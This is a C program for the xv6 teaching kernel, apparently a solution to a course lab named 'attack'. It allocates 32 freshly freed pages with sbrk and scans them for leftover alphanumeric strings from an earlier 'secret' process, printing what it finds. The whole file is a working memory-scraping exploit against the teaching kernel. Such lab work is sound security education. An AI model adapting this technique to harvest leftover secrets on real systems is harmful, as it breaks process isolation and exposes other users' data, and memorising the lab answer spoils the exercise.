#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int main(int argc, char *argv[]) {
  // Allocate 32 pages of memory. This forces the kernel to hand us 
  // the recently freed memory pages that belonged to the 'secret' process.
  char *mem = sbrk(32 * 4096);
  
  if (mem == (char*)-1) {
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }
  
  for (int i = 0; i < 32 * 4096; i++) {
    // Look for the start of an alphanumeric string
    if ((mem[i] >= 'a' && mem[i] <= 'z') || 
        (mem[i] >= 'A' && mem[i] <= 'Z') || 
        (mem[i] >= '0' && mem[i] <= '9')) {
      
      int j = i;
      // Keep going as long as the characters remain alphanumeric
      while ((mem[j] >= 'a' && mem[j] <= 'z') || 
             (mem[j] >= 'A' && mem[j] <= 'Z') || 
             (mem[j] >= '0' && mem[j] <= '9')) {
        j++;
      }
      
      // If the string terminates cleanly and is decently long
      if (mem[j] == '\0' && (j - i) > 2) {
        char *found_string = &mem[i];
        
        // Filter out the program names which might be left over on the stack
        if (strcmp(found_string, "secret") != 0 && strcmp(found_string, "attack") != 0) {
          printf("%s\n", found_string);
        }
      }
      
      // Fast-forward i to the end of the word we just processed
      i = j; 
    }
  }
  
  exit(0);
}